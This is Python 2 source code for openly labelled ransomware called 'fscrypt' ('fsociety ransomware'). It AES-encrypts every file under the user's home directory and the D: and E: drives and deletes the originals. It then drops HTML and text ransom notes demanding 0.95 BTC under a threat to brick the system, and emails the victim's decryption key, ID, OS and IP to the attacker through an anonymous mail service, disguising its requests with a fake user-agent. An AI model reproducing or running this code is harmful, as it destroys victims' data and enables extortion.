from Crypto.Cipher import AES
from Crypto import Random
from hashlib import md5
from random import randint

import os
import sys
import time
import urllib2
import platform
import mechanize
import webbrowser
import subprocess


class Node:
    def __init__(self):
        self.data = None
        self.next = None

    def __str__(self):
        return str(self.data)


class LinkedList:
    def __init__(self):
        self.head = None

    def add(self, data):
        new_node = Node()
        new_node.data = data
        new_node.next = self.head
        self.head = new_node

    def remove(self, data):
        prev = None
        node = self.head
        
        while node:
            if node.data == data:
                if node == self.head:
                    self.head = self.head.next
                    return
                else:
                    prev.next = node.next
                    return
            else:
                prev = node
                node = node.next

    def get(self, index):
        self.count = 1
        node = self.head

        while node:
            if self.count == index:
                return node.data
            else:
                node = node.next
                self.count += 1
        return None

    def __str__(self):
        node = self.head
        ret = ''
        
        while node:
            ret += str(node.data)
            node = node.next
        return ret


class Fscrypt(object):

    def __init__(self):
        self.cwd         = os.getcwd() # self explainatory :)
        self.path_enc    = None        # main directory to encrypt
        self.os_name     = None
        self.os_release  = None
        self.ipv4_addr   = ''          # public ipv4 addr

        self.id_length   = 69          # size of identify code
        self.key_length  = 69          # size of ke
        self.session_id  = ''          # identify code
        self.session_key = ''          # encryption key

        self.file_count  = 0
        self.btc_addr    = 'address_of_your_btc_wallet'
        
        # After infecting, we will send an email to the attacker
        # which reports information about the victim.
        self.recipient  = "some@email.address"
        self.subject    = ''
        self.msg_cont   = ''


    def set_env(self):
        # Detect OS and release.
        self.os_name = platform.system()
        self.os_release = platform.release()
        
        # Set encryption path.
        if self.os_name == 'Linux':
            #self.path_enc = os.getenv('HOME')
            self.path_enc = '/home/aesophor/sim_home'
        
        elif self.os_name == 'Windows':
            self.path_enc = 'C:/Users/' + os.getenv('username')


    def get_ipv4(self):
        while True:
            try:
                # We have to make sure that the encryption process will only start
                # When the victim is connected to the Internet,
                # or the id and key will not be sent.
                return urllib2.urlopen('http://ip.42.pl/raw').read()
            except urllib2.URLError, e:
                print "[-] No Internet connection! Unable to connect..."
                # Check connection every 5 minutes.
                time.sleep(300)


    def generate_sequence(self, length):
        # We use LinkedList to generate the sequence (either id or key).
        l = LinkedList()
        ret = ''
        
        # Fill our LinkedList with integers from 0 to 68.
        # Then grab element randomly from the LinkedList.
        for i in range(0, length):
            l.add( (length-1) - i)
            
        remaining = length
        for i in range(0, length):
            index = randint(1, remaining)
            temp = l.get(index)
            ret += str(temp)
            l.remove(temp)
            remaining -= 1
        return ret

    def idgen(self, length):
        return self.generate_sequence(self.id_length)

    def keygen(self, length):
        return self.generate_sequence(self.key_length)


    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = d_i = ''
        while len(d) < key_length + iv_length:
            d_i = md5(d_i + password + salt).digest()
            d += d_i
        return d[:key_length], d[key_length:key_length+iv_length]

    def encrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = Random.new().read(bs - len('Salted__'))
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        out_file.write('Salted__' + salt)
        finished = False
        while not finished:
            chunk = in_file.read(1024 * bs)
            if len(chunk) == 0 or len(chunk) % bs != 0:
                padding_length = (bs - len(chunk) % bs) or bs
                chunk += padding_length * chr(padding_length)
                finished = True
            out_file.write(cipher.encrypt(chunk))

    def decrypt(self, in_file, out_file, password, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)[len('Salted__'):]
        key, iv = self.derive_key_and_iv(password, salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = ''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:
                padding_length = ord(chunk[-1])
                chunk = chunk[:-padding_length]
                finished = True
            out_file.write(chunk)
    

    def encrypt_dirs(self, paths):
        
        for path in paths:
            for dirname, dirnames, filenames in os.walk(path):
                # Print path to all filenames.
                for filename in filenames:
                    try:
                        # Call the encrypt function.
                        with open(os.path.join(self.cwd, dirname, filename), 'rb') as in_file, open(os.path.join(self.cwd, dirname,filename) + ".fuxsc", 'wb') as out_file:
                            self.encrypt(in_file, out_file, self.session_key)
                        # Delete the original file after encrypting it.
                        os.remove(os.path.join(self.cwd, dirname, filename))
                        self.file_count += 1
                    except:
                        # Catch exception to deal with permission denied problem.
                        continue

    def decrypt_dirs(self, paths):
        
        for path in paths:
            for dirname, dirnames, filenames in os.walk(path):
                # Print path to all filenames.
                for filename in filenames:
                    # This file cannot be decrypted, so do not perform decryption on this one.
                    if filename == "NOTICE.html" or filename == "notice.txt":
                        continue        
                    # Call the decrypt function.
                    with open(os.path.join(self.cwd, dirname,filename), 'rb') as in_file, open(os.path.join(self.cwd, dirname,filename)[:-6], 'wb') as out_file:
                        self.decrypt(in_file, out_file, self.session_key)
                    # Delete the encrypted file after encrypting it.
                    os.remove(os.path.join(self.cwd, dirname, filename))


    # We will use mechanize to simulate a web browser,
    # and send an anonymous mail with the service provided by anonymouse.org.
    def send_report(self):
        br = mechanize.Browser()
        
        # Setting and importing variables
        self.subject = 'fscrypt - New Infection from ' + self.ipv4_addr
        self.msg_cont = """Identification Code: ' + %s + '\n
                           Decryption Key: ' + %s + '\n
                           OS Info: ' + %s + %s + '\n
                           First Connect: ' + %s + '\n\n\n
                           """ % (self.session_id, self.session_key, self.os_name, self.os_release, self.ipv4_addr)
        
        url     = "http://anonymouse.org/anonemail.html"
        to      = self.recipient
        subject = self.subject
        message = self.msg_cont
        
        # Including headers(User-Agent) so that it looks legit
        headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
        br.addheaders = [('User-agent', headers)]
        br.open(url)
        
        # Adding some configurations to prevent suspicion and other stuff
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_debug_http(False)
        br.set_debug_redirects(False)
        
        br.select_form(nr=0)
        br.form['to'] = to
        br.form['subject'] = subject
        br.form['text'] = message
        
        result = br.submit()


    def start(self):
        # Detect and set system info.
        print "[*] Detecting OS"
        self.set_env()
        
        # Retrieve victim ip addr
        print "[*] Fetching ipv4 address"
        self.ipv4_addr = self.get_ipv4()
       
        # Generate identify code and encryption key.
        print "[*] Generating session credential"
        self.session_id = self.idgen(self.id_length)
        for i in range(0,2):
            self.session_key += self.keygen(self.key_length)
        
        print 
        print "[*] Session ID: " + self.session_id
        print "[*] Session Key: " + self.session_key
        print
        print " fscrypt"
        print " fsociety ransomware"
        print " Version: Dev-1.0.2"
        print " Host OS: " + self.os_name + self.os_release
        print " First connect: " + self.ipv4_addr
        print "================================================="
        print " [*] Available Actions:"
        print "     (1) Encrypt disk"
        print "     (2) Decrypt disk"
        print
        
        
        while True:
            try:
                self.choice = raw_input("[fscrypt] > ")
                
                if self.choice == '1':
                    print "[*] fscrypt encryption initialized."
                    
                    # Encrypt all files under user(for Linux and Windows), D:\ and E:\ (for Windows)
                    self.encrypt_dirs( [self.path_enc, 'D:/', 'E:/'] )
                    
                    # Write HTML notice to user desktop.
                    with open(self.path_enc + '/Desktop/NOTICE.html', 'w+') as html:
                        notice = """<HEAD>\n<TITLE>#OPfuxsocy</TITLE>\n</HEAD>\n
                                    <BODY BGCOLOR="BLACK">\n<BODY TEXT="RED">\n
                                    <CENTER>\n
                                    <H1><br>#OPfuxsocy<br></H1>\n
                                    <H2>Your files are now encrypted.</H2>\n
                                    <H4>To get the key to decrypt files you have to pay 0.95 BTC.</H4>\n
                                    <H5>If the payment is not made in 7 days, we will brick your entire system.</H5>\n
                                    <H3>_</H3>\n
                                    <H4>Bitcoin address: {0}</H4>\n
                                    <H3>_</H3>\n
                                    <H5>Your System: {1} {2} | 
                                    First Connected: {3} | 
                                    Total encrypted {4} files. </H5>\n
                                    <H5>For more info, check notice.txt on your desktop.</H5>\n
                                    <H5>More instruction forthcoming - fsociety.</H5>\n
                                    <IMG SRC="https://i.imgur.com/9g2PgPA.jpg">\n
                                    </CENTER>""".format(self.btc_addr, self.os_name, self.os_release, self.ipv4_addr, self.file_count)
                        html.write(notice)
                        
                    # Write txt notice to user desktop
                    with open(self.path_enc + '/Desktop/notice.txt', 'w+') as txt:
                        notice = """#OPfuxsocy\n
                                    Your files are now encrypted. To get the key to decrypt the files, you have to pay 0.95 BTC.\n
                                    If the payment is not made in 7 days, we will brick your entire system.\n\n\n
                                    -Instructions on making payment:\n
                                    #1 You should register a Bitcoin Wallet.\n\n
                                    #2 Purchase Bitcoins - Although it is not yet easy to buy bitcoins, it is getting simpler every day.\n
                                    (Coin.mx, LocalBitcoins.com, bitquick.co, ...)\n\n
                                    #3 Send 0.95 BTC to Bitcoin Address: {0}\n\n
                                    #4 Contact us via email: {1} , send us BOTH your <Identification Code> and <Transaction ID (TXID)>.\n
                                    (You can find in detailed info about transaction you made.)\n\n
                                    #5 Activation may takes up to 48 hours. The moment we verify your payment, 
                                    we will send you the decryption software and your unique key.\n\n
                                    Identification Code: {2}\n
                                    Bitcoin Address: {3}\n\n\n
                                    fsociety""".format(self.btc_addr, self.recipient, self.session_id, self.btc_addr)
                        txt.write(notice)
                        
                    # Done. report to c&c.
                    self.send_report()
                    
                    # Display notice to user.
                    webbrowser.open(self.path_enc + '/Desktop/NOTICE.html')
                    print "[*] fscrypt encryption finished. Total encrypted %i files." % self.file_count
                    
                elif self.choice == '2':
                    print "[*] fscrypt decryption initialized."
                    
                    self.session_key = raw_input("[+] Please enter the key the files were encrypted with : ")
                    self.confirm = raw_input("[*] Is the key correct? (If the key is incorrect, all your files will be unrecoverable.) (y/n)")
                    if self.confirm == 'n' or self.confirm == 'N':
                        print "[-] Session aborted."
                    
                    # Decrypt the files
                    self.decrypt_dirs( [self.path_enc, 'D:/', 'E:/'] )
                    print "[*] fscrypt decryption complete."
                    
                else:
                    print "[-] Your selection does not exist."
                    
            except KeyboardInterrupt:
                print "\n[-] Session ended as user requested."
                sys.exit()


fscrypt = Fscrypt()
fscrypt.start()
